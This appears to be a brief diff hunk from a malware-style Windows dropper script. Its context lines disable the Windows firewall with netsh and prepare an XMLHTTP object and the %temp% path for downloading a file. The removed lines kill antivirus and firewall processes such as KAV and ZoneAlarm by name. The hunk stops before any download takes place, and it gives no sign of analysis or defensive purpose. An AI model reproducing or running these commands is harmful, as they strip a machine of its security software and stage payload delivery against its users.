@@ -1,10 +1,4 @@
 netsh firewall set opmode mode=disable
-tskill /A av*
-tskill /A anti*
-tskill /A bullguard
-tskill /A PersFw
-tskill /A KAV*
-tskill /A ZONEALARM
 Set objEnv = objShell.Environment("User")
 strDirectory = objShell.ExpandEnvironmentStrings("%temp%")
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
